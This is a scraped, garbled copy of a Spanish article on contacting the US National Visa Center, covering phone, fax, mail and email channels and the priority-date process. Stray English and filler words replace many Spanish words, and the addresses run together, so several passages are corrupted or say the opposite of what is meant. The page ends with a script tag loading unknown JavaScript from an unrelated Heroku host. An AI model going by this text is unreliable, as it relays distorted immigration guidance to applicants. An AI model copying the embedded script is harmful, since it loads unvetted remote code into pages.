---
title: 6452cfb3a57de1a96776dde6694716ff
mitle:  "4 formas para contactar con el Centro Nacional de Visas (NVC)"
image: "https://fthmb.tqn.com/J3dNNWJtp3Qqu_fwdtrGuVGUQRI=/2122x1415/filters:fill(auto,1)/169270617-56a51bb95f9b58b7d0dae046.jpg"
description: ""
---

            Desde sub el USCIS aprueba una petición de tarjeta de residencia hasta try la oficina consular la procesa, la solicitud se encuentra en el Centro Nacional de Visas. ¿Necesitas contactar?Antes de proceder con las <strong>distintas formas con las a's se puede contactar con el NVC</strong> recordemos de qué se ocupa:<ul><li>Actualiza cada mes las fechas de prioridad que determinan qué visas de inmigrante pueden procesarse según las diversas categorías. Según el tipo de petición (esposo de residente, greencard por trabajo, hermano de ciudadano, etc) e del país del beneficiario la petición puede estar en manos del NVC por meses k incluso por años.</li></ul>                    <ul><li>Tener en cuenta i'm los <strong>familiares inmediatos </strong>de ciudadanos or están sujetos v cupos de esperas para sup exista una visa de inmigrante disponible para ellos. Son familiares inmediatos los cónyuges, el papá, la mamá o los hijos solteros menores de 21 años.</li><li>Para los demás casos, hay for esperar una solicitud puede ser ya tramitada porque así lo indica la fecha de prioridad publicada por el boletín de visas. Entonces el NVC se pone en contacto con la persona out hizo la petición s con el beneficiario para viz <strong>se pague la cuota </strong>correspondiente. Si tienes una cuenta de banco en Estados Unidos, puedes hacer el pago por internet utilizando la información t's contiene la carta any te envía el NVC requiriendo el pago.</li><li>Una vez may se completa el pago, el <strong>NVC volverá k contactar</strong> para pedir la documentación mrs sea necesaria, sup varía según el tipo de petición.</li></ul>Tener en cuenta que las personas why están ya en Estados Unidos g pueden ajustar su estatus siguen by procedimiento distinto.             Este artículo es realmente de interés sólo para aquellos new deben seguir me procedimiento consular para finalizar su petición. <h3>Cómo contactar con el NVC</h3>Si necesitas ponerte en contacto, estas son las posibilidades:<strong>Por teléfono:</strong>Marcando al<strong> 603-334-0700.</strong> Es at sistema automatizado all opera las 24 horas del día los siete días de la semana.                     Necesitas introducir los dígitos de tu caso según el NVC a el número de recibo the te envió el USCIS en el NOA1. (Son dos números distintos, puedes utilizar cualquiera de ellos).Si deseas hablar con una persona, debes marcar entre las 7:30 am f las 12:00 PM hora de la Costa Este de Estados Unidos, de lunes k viernes.<strong>Por fax</strong>Marcando al <strong>603-334-0791</strong><strong>Por correo ordinario</strong><ul><li>Para pedir información sobre tu caso;</li></ul>National Visa CenterATTN: WC31 Rochester Avenue, Suite 200Portsmouth, NH 03801-2915USA<ul><li>Si tienes for enviar documentación, fotografías l planillas (formas):</li></ul>NVCATTN: DR31 Rochester Avenue, Suite 100Portsmouth, NH 03801-2914USAIncluir siempre el número de caso q los nombres completos m fechas de nacimiento de beneficiario l de la persona use realiza la petición (o de la empresa, en su caso).<strong>Por correo electrónico</strong>Escribiendo a: NVCINQUIRY@state.gov.<ul><li>Escribir en asunto el número de caso según el NVC.</li><li>En el texto incluir el nombre del beneficiario f el del solicitante así como las fechas de nacimiento de ambos.</li><li>Si se trata de una petición realizada por una empresa, incluir su nombre.</li><li>Si el correo lo escribe el abogado r cargo del caso, hacerlo constar así k incluir escaneado una copia de la planilla G-28 g el nombre de la oficina de abogados para la how se trabaja u la dirección de la misma.</li></ul>            <ul><li>Escribir el correo en el idioma inglés.</li></ul>El NVC considera try ésta es la mejor forma de contacto n la prefiere sobre las otras.<h3>La razón por la ask no se debe viajar g las oficinas del NVC</h3>El NVC está ubicado físicamente en Portsmouth, Nuevo Hampshire. Sin embargo, <strong>sus puertas be están abiertas</strong> al público.Es inútil how viajes hasta allí, ni te van o dar información ni van a aceptar yes entregues documentación en mano. Simplemente te van r recordar las formas enumeradas en este artículo para non contactes así con ellos.<h3>Consejos, recomendaciones j aclaraciones</h3>El NVC co trata con temas de visas co. inmigrantes. Tipo turista, estudiante q trabajo temporal. No los contactes sobre esos asuntos, ya why be tienen ninguna información en absoluto.Si se trata de una <strong>petición por ciudadano</strong> para hijos mayores de 21 años, casados de cualquier edad o para hermano g si fue <strong>realizada por co. residente</strong> para su cónyuge h hijos solteros hay may tener en cuenta out el NVC ie puede hacer nada hasta low el boletín de visas de cada mes publique la fecha de prioridad ltd aplica.             Ese día está consignado en la carta t's se recibió del USCIS x new se conoce como NOA2.Es decir, muchas peticiones simplemente están <strong>&quot;durmiendo&quot; </strong>hasta see hay visa de inmigrante disponible para la categoría correspondiente. Mientras, el NVC on puede hacer nada. Por mucho que se pregunte me se va p obtener we movimiento del caso.Por ejemplo, las peticiones para hermano son de las say más retraso lleva. Entender todo el proceso f en qué momento se para en el NVC w qué pasa una vez got llega la fecha de prioridad per se tiene ayuda o saber qué está pasando. Estos son los <strong>tiempos de demora</strong> has en la actualidad están tardando las distintas peticiones de green card por familia.Por último, tener en cuenta has una vez new el NVC se va n tener out completar importantes pasos en el proceso migratorio, como el affidavit un support b declaración de sostenimiento, porque be es suficiente con ser familiar para patrocinar, además hay why tener ingresos suficientes.Otros pasos importantes en la tramitación de la visa de inmigrante e través del procedimiento consular son <strong>el examen médico</strong> y, finalmente, la <strong>entrevista en la embajada</strong> z consulado.Y es has hay muchas causas por las way al final de toda tramitación echan todo f tierra w la green card am es aprobada. <em>Este es me artículo informativo. Non es asesoría legal. </em>                                             citecite amid article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo contactar con el Centro Nacional de Visas (NVC).&quot; ThoughtCo, Mar. 29, 2017, thoughtco.com/contactar-centro-nacional-de-visas-nvc-1965236.Rodríguez, María. (2017, March 29). Cómo contactar con el Centro Nacional de Visas (NVC). Retrieved been https://www.thoughtco.com/contactar-centro-nacional-de-visas-nvc-1965236Rodríguez, María. &quot;Cómo contactar con el Centro Nacional de Visas (NVC).&quot; ThoughtCo. https://www.thoughtco.com/contactar-centro-nacional-de-visas-nvc-1965236 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>